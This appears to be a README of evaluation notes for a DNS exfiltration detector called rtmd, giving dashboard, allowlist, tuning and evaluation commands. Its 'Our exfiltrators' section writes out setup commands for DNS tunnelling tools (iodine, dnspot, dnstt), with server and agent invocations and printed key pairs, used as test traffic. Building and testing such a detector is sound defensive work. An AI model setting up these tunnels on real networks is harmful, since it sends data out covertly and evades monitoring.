# Real-world Evaluation

Web Dashboard:

```bash
xdg-open http://127.0.0.1:6000/
```

View alerts in terminal:

```bash
curl 127.0.0.1:6000/alerts | jq
```

Allowlisting a domain:

```bash
curl -X POST 127.0.0.1:6000/allowlist --data 'RDNS 128.0.0.0/16'
```

Ignore a host:

```bash
curl -X POST 127.0.0.1:6000/ignore-host --data 'A.B.C.D'
```

Tune the threshold:

```bash
../../target/release/rtmd -t 0.5 -R 120000 --syslog 127.0.0.1:5150 --duration 86400 tune \
 --acceptable-fpr 0.01 --acceptable-fpr 0.005 --acceptable-fpr 0.001 \
 --acceptable-fpr 0.0005  --acceptable-fpr 0.0001 
```

Evaluate:

```
../../target/release/rtmd -t 6.975 -R 120000 --syslog 127.0.0.1:5151 --duration $((60 * 60 * 24 * 3)) --port 5000 --trust-rdns   eval 2>&1 | tee output
```


```
scripts/human-ops-export.py      reports/real/output
scripts/alert-series-export.py   reports/real/alerts.jsonl 
scripts/resource-usage-export.py reports/real/pidstat.json
scripts/throughput-export.py     reports/real/output  
```

# Our exfiltrators

## iodine

```
sudo iodine  -rT A  i.example.com
python3 -m http.server -b 192.168.191.2
# curl http://192.168.191.4:8000/garbage.dat > /dev/null
```

## dnspot

server gen key:

```
./dnspot-server generate
public key: hh5bjfucwr0loxn5rdw3gqu8cauj9xn6vmte43ce2vixjw8rcf
private key: 387mpa3l8m6cg1g81tib4639no41d5j8mdo0imxvypgw2l55aq
```

```bash
sudo ./dnspot-server --privateKey 387mpa3l8m6cg1g81tib4639no41d5j8mdo0imxvypgw2l55aq --dnsSuffix p.example.com
./dnspot-agent --dnsSuffix p.example.com --serverPublicKey hh5bjfucwr0loxn5rdw3gqu8cauj9xn6vmte43ce2vixjw8rcf
```

## Naive Exfiltrator

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/Pwdb_top-10000.txt


## dnstt

https://www.bamsoftware.com/software/dnstt/

```
# ./dnstt_server_arm64 --gen-key
privkey 815e01768fdcfe816aad89380678465b3ee93567453e4507fe4c015204c4bb79
pubkey  b9a63648630b51916ffb155db5d845253f704b1b046868cc254219b0c0393149
# ./dnstt-server -udp :53 -privkey 815e01768fdcfe816aad89380678465b3ee93567453e4507fe4c015204c4bb79 t.example.com 127.0.0.1:8000
```

# What should we eval

- CPU/RAM usage
- Number of alerts over time?
- Human operations. 
